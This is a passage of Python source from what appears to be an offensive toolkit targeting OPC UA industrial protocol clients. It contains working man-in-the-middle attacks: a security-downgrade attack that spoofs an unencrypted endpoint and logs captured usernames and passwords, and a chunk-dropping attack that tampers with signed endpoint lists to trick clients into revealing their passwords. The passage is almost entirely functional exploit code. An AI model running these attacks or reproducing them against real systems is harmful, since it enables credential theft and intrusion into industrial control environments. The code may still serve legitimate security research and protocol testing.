        write_client_msg(clientsock, ReverseHelloMessage(
          severUri=server_uri,
          endpointUrl=revurl,
        ))
        return clientsock
      
    while True:
      attacker = attacker_factory(server_eps)
      attacker.send(None)
      try:
        while True:
          attacker.send(clientsocker())
      except StopIteration:
        if not persist:
          break
    
    if revhello_addr is None:
      listener.shutdown(SHUT_RDWR)
      listener.close()


# None downgrade password stealer.
def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:  
  # Make a spoofed endpoint with None security that only accepts passwords. 
  # Base this on an existing endpoint, preferably those similar to what we want.
  spoofed_ep = max(server_eps, key=lambda ep: ep.securityPolicyUri == SecurityPolicy.NONE)
  spoofed_policy = max(spoofed_ep.userIdentityTokens, default=None, key=lambda p: p.tokenType == UserTokenType.USERNAME)
  if not spoofed_policy or spoofed_policy.tokenType != UserTokenType.USERNAME:
    spoofed_policy = userTokenPolicy.create(
      policyId='1',
      tokenType=UserTokenType.USERNAME,
      issuedTokenType=None,
      issuerEndpointUrl=None,
      securityPolicyUri=SecurityPolicy.NONE,
    )
  else:
    spoofed_policy = spoofed_policy._replace(securityPolicyUri=SecurityPolicy.NONE)
  spoofed_ep = spoofed_ep._replace(
    securityPolicyUri=SecurityPolicy.NONE,
    securityMode=MessageSecurityMode.NONE,
    userIdentityTokens=[spoofed_policy]
  )
  
  # Creates a simple response header based on a request.
  def simple_respheader(reqheader):
    return responseHeader.create(
      timeStamp=datetime.now(),
      requestHandle=reqheader.requestHandle,
      serviceResult=0,
      serviceDiagnostics=None,
      stringTable=[],
      additionalHeader=None,
    )
  
  # Server loop.
  while True:
    clientsock = yield
  
    # Get hello.
    hello = read_client_msg(clientsock, HelloMessage)
    log('Received Hello message from client.')
    
    # Reflect buffer sizes in Ack.
    write_client_msg(clientsock, AckMessage(**{name: getattr(hello, name) for name, _ in AckMessage.fields}))
    
    # Next should be an unencrypted OPN.
    opn = read_client_msg(clientsock, OpenSecureChannelMessage)
    log('Received OpenSecureChannel from client.')
    if opn.securityPolicyUri != SecurityPolicy.NONE:
      raise AttackNotPossible(f'OPN from client has unexpected security policy {opn.securityPolicyUri}.')
    
    # Send an OPN response initiating an unencrypted channel.
    opnconv, _ = encodedConversation.from_bytes(opn.encodedPart)
    opnreq, _ = openSecureChannelRequest.from_bytes(opnconv.requestOrResponse)
    token = channelSecurityToken.create(
      channelId=opn.secureChannelId + 1,
      tokenId=1,
      createdAt=datetime.now(),
      revisedLifetime=opnreq.requestedLifetime,
    )
    write_client_msg(clientsock, OpenSecureChannelMessage(
      secureChannelId=token.channelId,
      securityPolicyUri=SecurityPolicy.NONE,
      senderCertificate=None,
      receiverCertificateThumbprint=None,
      encodedPart=encodedConversation.to_bytes(encodedConversation.create(
        sequenceNumber=opnconv.sequenceNumber,
        requestId=opnconv.requestId,
        requestOrResponse=openSecureChannelResponse.to_bytes(openSecureChannelResponse.create(
          responseHeader=simple_respheader(opnreq.requestHeader),
          serverProtocolVersion=0,
          securityToken=token,
          serverNonce=None,
        ))
      ))
    ))
    
    # Response message helper.
    def responder(reqmsg, resptype, **data):
      reqHeader, _ = requestHeader.from_bytes(NodeIdField().from_bytes(reqmsg.requestOrResponse)[1])
      write_client_msg(clientsock, ConversationMessage(
        secureChannelId=token.channelId,
        tokenId=token.tokenId,
        encodedPart=encodedConversation.to_bytes(encodedConversation.create(
          sequenceNumber=reqmsg.sequenceNumber,
          requestId=reqmsg.requestId,
          requestOrResponse=resptype.to_bytes(resptype.create(
            responseHeader=simple_respheader(reqHeader),
            **data
          )),
        ))
      ))
  
    # Expecting either GetEndpoints or CreateSession from the client next.
    convomsg1 = read_client_msg(clientsock, ConversationMessage)
    convo1, _ = encodedConversation.from_bytes(convomsg1.encodedPart)
    try:
      ep_req, _ = getEndpointsRequest.from_bytes(convo1.requestOrResponse)
    except DecodeError:
      ep_req = None
    
    if ep_req:
      # Respond with the spoofed endpoint.
      log('Received GetEndpointsRequest. Responding with spoofed (unencrypted password demanding) endpoint.')
      responder(convo1, getEndpointsResponse, endpoints=[spoofed_ep])
    else:
      csr, _ = createSessionRequest.from_bytes(convo1.requestOrResponse)
      log('Received CreateSessionRequest.')
      responder(convo1, createSessionResponse,
        sessionId=NodeId(9,1234),
        authenticationToken=NodeId(9,1235),
        revisedSessionTimeout=csr.requestedSessionTimeout,
        serverNonce=None,
        serverCertificate=spoofed_ep.serverCertificate,
        serverEndpoints=[spoofed_ep],
        serverSoftwareCertificates=[],
        serverSignature=signatureData.create(algorithm=None,signature=None),
        maxRequestMessageSize=csr.maxResponseMessageSize,
      )
      
      # Finally consume ActivateSessionRequest.
      convomsg2 = read_client_msg(clientsock, ConversationMessage)
      convo2, _ = encodedConversation.from_bytes(convomsg2.encodedPart)
      asr, _ = activateSessionRequest.from_bytes(convo2.requestOrResponse)
      log_success('Received unencrypted ActivateSessionResponse from client.')
      if asr.userIdentityToken.policyId != spoofed_policy.policyId:
        raise AttackNotPossible(f'Client picked unexpected policy ID: {asr.userIdentityToken.policyId}')
        
      log_success(f'Username: {asr.userIdentityToken.userName}')
      if asr.userIdentityToken.encryptionAlgorithm:
        log('However, password is still encrypted.')
      else:
        pwd = asr.userIdentityToken.password.decode(errors="replace")
        log_success(f'Password: {pwd}')
  
      # Kill this connection and end the attack round.
      clientsock.shutdown(SHUT_RDWR)
      clientsock.close()
      return

# MitM attack that uses the chunk dropping attack to modify signed endpoint info to trick a client into exposing its 
# password.
# If tcp_resets is True intentional connection interruptions will be introduced to make a client accept gaps even when
# it is strictly enforcing https://reference.opcfoundation.org/Core/Part6/v104/docs/6.7.2.4
def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : bool=False) -> ClientAttack:
  if tcp_resets:
    raise Exception('tcp_resets feature not yet implemented')
  
  # Given a binary endpoint array, this will return a list of byteranges to drop to turn the result into a suitable 
  # endpoint description.
  # Attempts to create an array with a single endpoint with a Sign security mode that requires an unencrypted password.
  def ranges_to_drop(ep_bytes):    
    # Store offsets and values of array elements.
    epcount, todo = IntField().from_bytes(ep_bytes)
    offsets = [None] * epcount
    for i in range(0, epcount):
      offsets[i] = len(ep_bytes) - len(todo)
      _, todo = endpointDescription.from_bytes(todo)
      
    # State for subroutines to update.
    cursor = 0
    result = []
    
    # Drop a certain amount of bytes. Throws an error if end is reached.
    def dropbytes(count):
      # print(f'dropbytes {count}')
      nonlocal cursor, result
      if count == 0:
        return
      
      assert(count > 0)
      if cursor < len(ep_bytes):
        if result and result[-1][1] == cursor:
          result[-1] = (result[-1][0], result[-1][1] + count)
        else:
          result += [(cursor, cursor + count)]
        cursor += count
      else:
        errormsg = 'Server endpoint list did not allow desired mutation'
        if epcount == 1:
          errormsg += ' because it only contained a single endpoint'
        elif epcount < 4:
          errormsg += f'. Probably because it only contained {epcount} entries'
        errormsg += '.\n Perhaps try against a discovery service instead?'
        raise AttackNotPossible(errormsg)
    
    # Keep dropping ranges until a specific desired byte range is added to the result.
    def drop_until_bytes(byteseq):
      # print(f'drop_until_bytes {repr(byteseq)}')
      nonlocal cursor
      
      tomatch = byteseq
      while tomatch:
        if cursor < len(ep_bytes) and ep_bytes[cursor] == tomatch[0]:
          cursor += 1
          tomatch = tomatch[1:]
        else:
          dropbytes(1)
    
    # Drop bytes until the cursor is positioned in front of a specific endpoint field.
    def drop_until_field(fieldname):
      # print(f'drop_until_field {fieldname}')
      nonlocal cursor
      
      # Find starting offset of endpoint the cursor is currently in.
      rcursor = max((offset for offset in offsets if offset <= cursor), default=offsets[0])
      
      # Keep consuming endpoint description until either cursor or field is reached.
      # Run through the description at most twice.
      for _ in range(0,2):
        for descName, descType in endpointDescription.fields:
          if rcursor > cursor:
            dropbytes(rcursor - cursor)
            
          if rcursor == cursor and descName == fieldname:
            # Got it.
            return
          else:
            rcursor = len(ep_bytes) - len(descType.from_bytes(ep_bytes[rcursor:])[1])
          
      # Should have returned or raised by now, if fieldname is valid.
      assert(False)
      
    # Consume a field. Keep it (and return True) if it meets the predicate. Otherwise drop it.
    def checkfield(fieldType, predicate=lambda _: True):
      # print(f'checkfield {type(fieldType).__name__}')
      nonlocal cursor
      
      field, tail = fieldType.from_bytes(ep_bytes[cursor:])
      fieldsize = len(ep_bytes) - cursor - len(tail) 
      assert(fieldsize > 0)
      if predicate(field):
        cursor += fieldsize
        return True
      else:
        dropbytes(fieldsize)
        return False
      
    # First, make the resulting array length one.
    drop_until_bytes(b'\x01\x00\x00\x00')
    
    # Keep general server info.
    drop_until_field('endpointUrl')
    checkfield(StringField()) # endpointUrl
    checkfield(applicationDescription) # server
    checkfield(ByteStringField()) # serverCertificate
    
    # Spoof a Sign security mode.
    drop_until_bytes(b'\x02\x00\x00\x00')
    
    # Next a non-None security policy is needed for channel security.
    while not checkfield(SecurityPolicyField(), lambda sp: sp != SecurityPolicy.NONE):
      drop_until_field('securityPolicyUri')
        
    # Set Identity token array and policyId string lengths to 1.
    drop_until_bytes(b'\x01\x00\x00\x00' * 2)
    
    # Set single policyId character to whatever.
    cursor += 1
    
    # Enforce UserName token type.
    drop_until_bytes(EnumField(UserTokenType).to_bytes(UserTokenType.USERNAME))
    
    # Two null strings.
    drop_until_bytes(b'\xff' * 8)
    
    # Finally make a None security policy is needed for password security.
    # This will probably either a subsequent None endpoint or token policy. But otherwise there's a good change the 
    # prefix can be taken from some other policy and the four bytes spelling out "None" from certificate data.
    drop_until_bytes(SecurityPolicyField().to_bytes(SecurityPolicy.NONE))
    
    # Finish with a TCP transport profile.
    drop_until_field('transportProfileUri')
    while not checkfield(StringField(), lambda pu: pu.endswith('uatcp-uasc-uabinary')):
      drop_until_field('transportProfileUri')
    
    # Finally, drop all but the last byte, the securityLevel of the last endpoint in the list.
    dropbytes(len(ep_bytes) - cursor - 1)
    return result
  
  # Test if rangedropping works on this endpoint list.
  log(f'Testing if attack is applicable.')
  server_epbytes = ArrayField(endpointDescription).to_bytes(server_eps)
  dropranges = ranges_to_drop(server_epbytes)
  
  if not any(ep.securityMode == MessageSecurityMode.SIGN for ep in server_eps):
    log('Warning: server does not advertise Sign security mode. Attack will probably not work, but trying anyway.')
  
  # Compute new endpoint list (and double-check if calculation was correct).
  spoofed_epbytes = b''
  prev_end = 0
  for start, end in dropranges:
    spoofed_epbytes += server_epbytes[prev_end:start]
    prev_end = end
  spoofed_epbytes += server_epbytes[prev_end:]
  spoofed_ep = ArrayField(endpointDescription).from_bytes(spoofed_epbytes)[0][0]
  
  assert(spoofed_ep.securityMode == MessageSecurityMode.SIGN and spoofed_ep.userIdentityTokens[0].tokenType == UserTokenType.USERNAME)
  log_success('Succesfully transformed token list into spoofed (password revealing) variant.')
  
  # Use server associated with this endpoint as upstream.
  proto, serverhost, serverport = parse_endpoint_url(spoofed_ep.endpointUrl)
  assert proto == TransportProtocol.TCP_BINARY
  log(f'Using {serverhost}:{serverport} as upstream server.')
  
  # Check if server allows tiny chunks.
  spoofed_hello = HelloMessage(
    version=0,
    receiveBufferSize=2**16,
    sendBufferSize=2**16,
    maxMessageSize=1,
    maxChunkCount=2**16-1,
    endpointUrl=spoofed_ep.endpointUrl,
  )
  with create_connection((serverhost, serverport)) as serversock:
    opc_exchange(serversock, spoofed_hello, AckMessage())
    log_success(f'Server appears to accept maxMessageSize of 1 and maxChunkCount of {spoofed_hello.maxChunkCount}')
  
  
  # MitM loop.
  while True:
    clientsock = yield
    with create_connection((serverhost, serverport)) as serversock:
      log('Connected to both client and server.')
      
      read_client_msg(clientsock, HelloMessage)
      log('Got Hello from client. Sending spoofed version to server.')
      ack = opc_exchange(serversock, spoofed_hello, AckMessage())
      ack.maxMessageSize = 1
      write_client_msg(clientsock, ack)
      
      # Forward OPN. Response may be chunked.
      client_opn = read_client_msg(clientsock, OpenSecureChannelMessage)
      cleartext = client_opn.securityPolicyUri == SecurityPolicy.NONE
      log(f'Forwarding {"cleartext" if cleartext else "encrypted"} OpenSecureChannelRequest')
      chunks = list(chunkable_opc_exchange(serversock, client_opn))
      for i, chunk in enumerate(chunks):
        write_client_msg(clientsock, chunk, i == len(chunks) - 1)
      
      # Keep processing conversation messages until the attack is finished or the client closes the channel.
      # Usually the latter will happen once the client has received the (spoofed) endpoint list, which it
      # will then use for a second connection.
      try:
        while True:
          client_convo = read_client_msg(clientsock, ConversationMessage)
          
          # Check client message.
          try:
            reqbytes = encodedConversation.from_bytes(client_convo.encodedPart)[0].requestOrResponse
          except DecodeError as err:
            if not cleartext:
              raise AttackNotPossible('Could not decode conversation. It is probably using SignAndEncrypt mode.')
            else:
              raise err
          
          if activateSessionRequest.check_type(reqbytes):
            # Got what we want.
            asr, _ = activateSessionRequest.from_bytes(reqbytes)
            log_success('Received unencrypted ActivateSessionRequest')
            log_success(f'Username: {asr.userIdentityToken.userName}')
            if asr.userIdentityToken.encryptionAlgorithm:
              log('However, password is still encrypted.')
            else:
              pwd = asr.userIdentityToken.password.decode(errors="replace")
              log_success(f'Password: {pwd}')
            
            # Done.
            return
          
          else:
            log('Forwarding ConversationMessage to server...')
            server_chunks = list(chunkable_opc_exchange(serversock, client_convo))
            log(f'Got {len(server_chunks)} chunks back.')
            
            # Glue chunks back together, dropping any signatures.
            resp_parts = list(encodedConversation.from_bytes(c.encodedPart)[0].requestOrResponse for c in server_chunks)
            respbytes = b''.join(resp_parts)

                
            # Handling depends on response type.
            if getEndpointsResponse.check_type(respbytes):
              resp, _ = getEndpointsResponse.from_bytes(respbytes)
              log('Endpoints request: replacing result with spoofed endpoint.')
              write_client_msg(clientsock, ConversationMessage(
                secureChannelId=server_chunks[0].secureChannelId,
                tokenId=server_chunks[0].tokenId,
                encodedPart=encodedConversation.to_bytes(encodedConversation.from_bytes(server_chunks[0].encodedPart)[0]._replace(
                  requestOrResponse=getEndpointsResponse.to_bytes(resp._replace(endpoints=[spoofed_ep]))
                ))
              ))
            elif createSessionResponse.check_type(respbytes):
              if not all(len(part) == 1 for part in resp_parts):
                raise AttackNotPossible('Got CreateSessionResponse, but not all chunks are one byte long.')
            
              # Find the binary offset and length of the endpoint list.
              todo = respbytes
              for fieldName, fieldType in createSessionResponse.fields:
                if fieldName == 'serverEndpoints':
                  eplist_start = len(respbytes) - len(todo)
                  _, todo = fieldType.from_bytes(todo)
                  eplist_end = len(respbytes) - len(todo)
                  break
                else:
                  _, todo = fieldType.from_bytes(todo)
              
              # Run the range dropping algorithm again. It may fail if more fields are ommitted.
              dropranges = ranges_to_drop(respbytes[eplist_start:eplist_end])
              log_success('Managed to drop ranges from CreateSessionResponse as well.')
              
              # Adjust for full response body.
              dropranges = [(start + eplist_start, end + eplist_start) for start, end in dropranges]
              
              # Drop associated chunks.
              keep_chunks = []
              lastend = 0
              for start, end in dropranges:
                keep_chunks += server_chunks[lastend:start]
                lastend = end
              keep_chunks += server_chunks[lastend:]
              
              # Send these to the client.
              log('Sending selected subset of chunks to client...')
              for chunk in keep_chunks[:-1]:
                write_client_msg(clientsock, chunk, False)
              write_client_msg(clientsock, keep_chunks[-1], True)
            
            else:
              log('Unknown message type. Forwarding it anyway.')
              for chunk in server_chunks[:-1]:
                write_client_msg(clientsock, chunk, False)
              write_client_msg(clientsock, server_chunks[-1], True)
          
      except ClientClosedChannel:
        pass
      